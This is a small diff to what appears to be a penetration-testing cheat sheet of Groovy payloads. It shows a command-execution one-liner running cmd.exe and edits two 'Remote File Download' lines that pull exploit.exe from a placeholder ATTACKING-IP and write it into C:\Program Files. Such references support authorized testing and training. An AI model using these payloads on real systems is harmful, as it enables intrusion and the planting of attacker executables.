@@ -91,7 +91,7 @@ Command Execution:
 def sout = new StringBuffer(), serr = new StringBuffer();def proc = 'cmd.exe /c dir C:\\'.execute();proc.consumeProcessOutput(sout, serr);proc.waitForOrKill(1000);println "out> $sout err> $serr"
 
 Remote File Download:
-def url = 'http://ATTACKING-IP/exploit.exe';def file = new File('exploit.exe').newOutputStream();file << new URL(url).openStream();file.close()
+def url = 'http://ATTACKING-IP/exploit.exe';def file = new File('C:\\Program Files\\exploit.exe').newOutputStream();file << new URL(url).openStream();file.close()
 (or)
-def url = 'file://ATTACKING-IP//public//exploit.exe';def file = new File('exploit.exe').newOutputStream();file << new URL(url).openStream();file.close()
+def url = 'file://ATTACKING-IP//public//exploit.exe';def file = new File('C:\\Program Files\\exploit.exe').newOutputStream();file << new URL(url).openStream();file.close()
 
